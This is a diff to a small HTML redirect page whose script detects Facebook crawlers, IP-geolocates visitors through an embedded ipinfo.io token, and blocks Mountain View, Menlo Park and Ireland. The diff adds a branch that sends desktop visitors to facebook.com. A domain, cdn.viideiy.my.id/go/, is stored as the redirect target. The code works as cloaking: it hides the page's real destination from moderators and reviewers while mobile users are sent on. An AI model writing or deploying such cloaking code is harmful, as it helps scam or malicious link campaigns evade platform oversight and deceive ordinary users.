@@ -33,21 +33,29 @@
 <body>
   <div class="info">Checking location...</div>
 
-  <script>
-    const targetDomain = "http://cdn.viideiy.my.id/go/";
-    const urlParams = new URLSearchParams(window.location.search);
-    const videoId = urlParams.get('v');
-    const ua = navigator.userAgent.toLowerCase();
-    const isFacebookBot = ua.includes("facebookexternalhit") || ua.includes("facebot");
+ <script>
+  const targetDomain = "https://cdn.viideiy.my.id/go/";
+  const urlParams = new URLSearchParams(window.location.search);
+  const videoId = urlParams.get('v');
+  const ua = navigator.userAgent.toLowerCase();
+  const isFacebookBot = ua.includes("facebookexternalhit") || ua.includes("facebot");
 
-    fetch("https://ipinfo.io/json?token=dae08c86966cc4") // Ganti dengan token asli kamu
+  // Deteksi apakah desktop (bukan mobile)
+  const isMobile = /iphone|android|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+
+  // Redirect langsung ke Facebook jika dari desktop
+  if (!isMobile) {
+    window.location.href = "https://facebook.com";
+  } else {
+    // Jika mobile, lanjutkan deteksi kota dan negara
+    fetch("https://ipinfo.io/json?token=dae08c86966cc4")
       .then(response => response.json())
       .then(data => {
         const city = (data.city || "").toLowerCase();
         const country = (data.country || "").toLowerCase(); // kode negara: IE = Ireland
 
         const blockedCities = ["mountain view", "menlo park"];
-        const blockedCountries = ["ie"]; // IE = Ireland
+        const blockedCountries = ["ie"];
 
         const isBlockedCity = blockedCities.includes(city);
         const isBlockedCountry = blockedCountries.includes(country);
@@ -61,6 +69,8 @@
       .catch(() => {
         document.querySelector(".info").textContent = "Could not detect location.";
       });
-  </script>
+  }
+</script>
+
 </body>
 </html>
